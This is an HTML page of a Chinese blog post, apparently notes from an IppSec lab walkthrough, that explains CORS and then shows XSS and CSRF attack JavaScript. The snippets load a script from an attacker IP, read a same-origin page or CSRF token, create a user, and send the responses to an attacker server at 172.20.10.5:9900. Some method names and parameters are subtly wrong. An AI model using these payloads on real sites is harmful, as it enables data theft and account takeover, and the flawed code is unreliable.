@@ -1,0 +1,328 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>JS那些事 | Zoukba&#39;s gun</title>
+  <meta name="author" content="zoukba">
+  
+  <meta name="description" content="JS的那些事这两天看了IppSec大哥打靶机，看大哥使用了CORS+CSRF什么是CORSCORS跨域资源共享，是一种基于HTTP头的机制，该机制通过允许服务器标示除了它自己以外的其它origin（域，协议和端口），这样浏览器可以访问加载这些资源。跨源资源共享还通过一种机制来检查服务器是否会允许要发送的真实请求，该机制通过浏览器发起一个到服务器托管的跨源资源的”预检”请求。在预检中，浏览器发送的头中标示有HTTP方法和真实请求中会用到的头
+CORS允许浏览器向跨源服务器，发出XMLHttpRequest请求，从而克服了AJAX只能同源使用的限制
+相关参数12Access-Control-Allow-Origin				#表示可以接受跨域的域名Access-Control-Allow-Credentials	#表示是否允许发送Cookie或其他凭据
+
+同时Access-Control-Allow-Origin，是造成跨域问题的主要参数。
+判断我们可以通过fuzz头文件的Origin参数，去观察返回包Access-Control-Allow-Origin来判断可以跨域访问的地址"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="JS那些事"/>
+  <meta property="og:site_name" content="Zoukba&#39;s gun"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/[object Object]" title="Zoukba&#39;s gun" type="application/atom+xml">
+  
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Zoukba&#39;s gun</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-user"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> JS那些事</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="JS的那些事"><a href="#JS的那些事" class="headerlink" title="JS的那些事"></a>JS的那些事</h1><h2 id="这两天看了IppSec大哥打靶机，看大哥使用了CORS-CSRF"><a href="#这两天看了IppSec大哥打靶机，看大哥使用了CORS-CSRF" class="headerlink" title="这两天看了IppSec大哥打靶机，看大哥使用了CORS+CSRF"></a>这两天看了IppSec大哥打靶机，看大哥使用了CORS+CSRF</h2><h3 id="什么是CORS"><a href="#什么是CORS" class="headerlink" title="什么是CORS"></a>什么是CORS</h3><p>CORS跨域资源共享，是一种基于HTTP头的机制，该机制通过允许服务器标示除了它自己以外的其它origin（域，协议和端口），这样浏览器可以访问加载这些资源。跨源资源共享还通过一种机制来检查服务器是否会允许要发送的真实请求，该机制通过浏览器发起一个到服务器托管的跨源资源的”预检”请求。在预检中，浏览器发送的头中标示有HTTP方法和真实请求中会用到的头</p>
+<p>CORS允许浏览器向跨源服务器，发出XMLHttpRequest请求，从而克服了AJAX只能同源使用的限制</p>
+<h3 id="相关参数"><a href="#相关参数" class="headerlink" title="相关参数"></a>相关参数</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin				<span class="comment">#表示可以接受跨域的域名</span></span><br><span class="line">Access-Control-Allow-Credentials	<span class="comment">#表示是否允许发送Cookie或其他凭据</span></span><br></pre></td></tr></table></figure>
+
+<p>同时<code>Access-Control-Allow-Origin</code>，是造成跨域问题的主要参数。</p>
+<h3 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h3><p>我们可以通过fuzz头文件的<code>Origin</code>参数，去观察返回包<code>Access-Control-Allow-Origin</code>来判断可以跨域访问的地址</p>
+<h2 id="JS编写"><a href="#JS编写" class="headerlink" title="JS编写"></a>JS编写</h2><h3 id="环境描述"><a href="#环境描述" class="headerlink" title="环境描述"></a>环境描述</h3><p>现在我们假设我们攻击一台服务器，并且我们已经通过前期手段了解了还存在一个不同子域的地址，但是由于做了同源策略我们无法访问。现在我们就需要使用CORS跨站请求，让同域名服务器去访问并给我们带回数据。这里我们可以搭配着xss进行</p>
+<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;document.cookies;&lt;/script&gt;								#看是否能打出cookie</span><br><span class="line">&lt;script src=&quot;http://172.20.10.10/1.js&quot;&gt;&lt;/script&gt;	#插入xss，让服务器运行我们的js文件 </span><br></pre></td></tr></table></figure>
+
+<h3 id="JS"><a href="#JS" class="headerlink" title="JS"></a>JS</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var req1 = new XMLHttpRequest();														#利用XMLHttpRequest去完成</span><br><span class="line">req1.open(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;http://zoukba.live/about/&#x27;</span>, <span class="literal">false</span>);				#<span class="keyword">async</span>:True,False来规定是否使用异步，True为异步；使用同步等到最后完成再带回数据</span><br><span class="line">req1.send();</span><br><span class="line"><span class="keyword">var</span> response = req1.responseText;</span><br><span class="line">	</span><br><span class="line">var req2 = new XMLHttpRequest();														#新建一个容器用来把数据带回</span><br><span class="line">req2.open(&#x27;GET&#x27;, &#x27;http://172.20.10.5:9900/&#x27; + encodeURIComponent(response), true);			#访问我们的服务器将数据编码后带回，最后完成选择异步</span><br><span class="line">req2.send();</span><br></pre></td></tr></table></figure>
+
+<h3 id="JS-CSRF"><a href="#JS-CSRF" class="headerlink" title="JS+CSRF"></a>JS+CSRF</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">var req1 = new XMLHttpRequest();														#利用XMLHttpRequest去完成</span><br><span class="line">req1.open(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;http://zoukba.live/&#x27;</span>, <span class="literal">false</span>);							#<span class="keyword">async</span>:True,False来规定是否使用异步，True为异步；使用同步等到最后完成再带回数据</span><br><span class="line">req1.withCredentials = true;																#如果在发送来自其他域的XMLHttpRequest请求之前，未设置withCredentials 为true，那么就不能为它自己的域设置cookie值。</span><br><span class="line">req1.send();</span><br><span class="line"><span class="keyword">var</span> response = req1.responseText;</span><br><span class="line">#获取token</span><br><span class="line"><span class="keyword">var</span> parser = <span class="keyword">new</span> DOMParser();</span><br><span class="line"><span class="keyword">var</span> doc = parser.parseFormString(response, <span class="string">&#x27;text/html&#x27;</span>);</span><br><span class="line">var token = doc.getElementsByname(&#x27;_token&#x27;)[0].value;				#根据返回表单的节点进行匹配后选值</span><br><span class="line">#csrf创建用户</span><br><span class="line"><span class="keyword">var</span> req2 = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line"><span class="keyword">var</span> params = <span class="string">&quot;username=xxx&amp;password=xxxx&amp;_token&quot;</span> + token;</span><br><span class="line">req2.open(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;http://zoukba.live/&#x27;</span>, <span class="literal">false</span>);</span><br><span class="line">req2.withCredentials = <span class="literal">true</span>;</span><br><span class="line">req2.setRequestHeader(&#x27;Content-Type&#x27;, &#x27;application/x-www-form-urlencoded&#x27;)		#增加请求头文件，说明提交参数类型</span><br><span class="line">req2.send(params);																					#发送post包内容</span><br><span class="line"><span class="keyword">var</span> response2 = req2.responseText;</span><br><span class="line"></span><br><span class="line">#把数据打回来</span><br><span class="line">var req3 = new XMLHttpRequest();														#新建一个容器用来把数据带回</span><br><span class="line">req3.open(&#x27;GET&#x27;, &#x27;http://172.20.10.5:9900/&#x27; + encodeURIComponent(response), true);			#访问我们的服务器将数据编码后带回，最后完成选择异步</span><br><span class="line">req3.send();</span><br></pre></td></tr></table></figure>
+
+
+
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2021/04/20/JS%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/" class="leancloud-visitors view" data-flag-title="JS那些事">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>上一页</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2021/04/19/无密码SSH登录/" type="button" class="btn btn-default ">下一页<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">留言</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"xxx","appKey":"xxx","placeholder":"提交评论时留下邮箱收到回复后将自动通知","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"]}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "提交评论时留下邮箱收到回复后将自动通知",
+    //     avatar:"monsterid",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail".split(','),
+    // });
+</script>
+
+		</section>
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2021-04-20 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/WEB大杂烩/">WEB大杂烩<span>1</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/CORS/">CORS<span>1</span></a></li> <li><a href="/tags/CSRF/">CSRF<span>1</span></a></li> <li><a href="/tags/JS/">JS<span>1</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#JS%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B"><span class="toc-article-text">JS的那些事</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E8%BF%99%E4%B8%A4%E5%A4%A9%E7%9C%8B%E4%BA%86IppSec%E5%A4%A7%E5%93%A5%E6%89%93%E9%9D%B6%E6%9C%BA%EF%BC%8C%E7%9C%8B%E5%A4%A7%E5%93%A5%E4%BD%BF%E7%94%A8%E4%BA%86CORS-CSRF"><span class="toc-article-text">这两天看了IppSec大哥打靶机，看大哥使用了CORS+CSRF</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFCORS"><span class="toc-article-text">什么是CORS</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%9B%B8%E5%85%B3%E5%8F%82%E6%95%B0"><span class="toc-article-text">相关参数</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%88%A4%E6%96%AD"><span class="toc-article-text">判断</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#JS%E7%BC%96%E5%86%99"><span class="toc-article-text">JS编写</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%8E%AF%E5%A2%83%E6%8F%8F%E8%BF%B0"><span class="toc-article-text">环境描述</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#XSS"><span class="toc-article-text">XSS</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#JS"><span class="toc-article-text">JS</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#JS-CSRF"><span class="toc-article-text">JS+CSRF</span></a></li></ol></li></ol></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2021 zoukba's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
